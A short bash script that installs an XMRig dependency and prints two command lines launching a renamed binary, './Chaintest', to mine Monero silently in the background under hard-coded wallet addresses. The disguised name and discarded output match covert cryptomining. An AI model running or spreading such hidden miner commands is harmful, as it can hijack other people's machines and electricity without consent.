#!/bin/bash

#install libhwloc-dev

sudo apt-get update
sudo apt-get install -y curl libhwloc-dev


echo "ly"
echo "nohup ./Chaintest --donate-level 0 -o pool.minexmr.com:443 -u 89xFXepSy2iBW1cMgaQwZwedkgDvAJcJk7UMyHYy1TsZA9aw9YhYWeobXn5mXQgx9eMduAdFrfXEGJaKEZ43eZWm7xeMCyi -k --tls --rig-id xxx 1>/dev/null 2>&1 &"
ehco "\n liang"
echo "nohup ./Chaintest --donate-level 0 -o pool.minexmr.com:443 -u 89m8QgPtKvCZZyu487FejTRmt4Acc5R6xCwHQsgsvyR8iHkm3VQirfAAauUGZCKMmQ2FLP6mDid9FgQC6HoxiyfwVLfq4jQ -k --tls --rig-id xxx 1>/dev/null 2>&1 &" 



